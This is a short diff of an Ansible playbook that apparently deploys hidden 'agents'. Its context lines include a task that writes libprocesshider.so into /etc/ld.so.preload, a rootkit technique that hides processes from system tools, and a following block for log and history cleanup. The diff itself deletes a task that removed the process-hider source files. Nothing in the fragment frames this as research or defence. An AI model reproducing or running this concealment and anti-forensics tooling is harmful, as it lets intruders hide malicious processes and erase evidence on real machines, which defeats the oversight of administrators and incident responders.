@@ -145,15 +145,6 @@
     - name: echo to preload
       shell: "echo '/usr/local/lib/libprocesshider.so' >> /etc/ld.so.preload"
 
-    # Clean up only source files, not the deployed agents
-    - name: Remove processhider source files
-      file:
-        path: "{{ item }}"
-        state: absent
-      loop:
-        - "{{ deploy_dir }}/processhider.c"
-        - "{{ deploy_dir }}/Makefile"
-
     
     # Log and history cleanup
     - block:
